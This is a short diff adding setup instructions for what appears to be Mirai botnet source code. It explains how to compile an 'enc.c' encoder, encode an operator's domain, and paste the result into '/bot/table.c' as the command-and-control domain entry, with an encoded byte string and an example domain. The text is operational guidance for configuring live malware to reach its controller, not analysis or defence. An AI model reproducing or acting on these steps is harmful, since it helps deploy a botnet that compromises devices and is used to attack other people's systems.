@@ -1,0 +1,5 @@
+``` use the enc.c file to encode your domain // ```
+``` compail the enc.c file : "gcc enc.c -o enc" ```
+``` use it like that ex my domain is http://virtuehub.one >> ./enc string virtuehub.one```
+``` Copy the string that enc generates and past it on /bot/table.c ```
+***    add_entry(TABLE_CNC_DOMAIN, "\x70\x77\x71\x6F\x6D\x2A\x65\x76\x69\x7D\x04", 11); // your domain goes here  ***
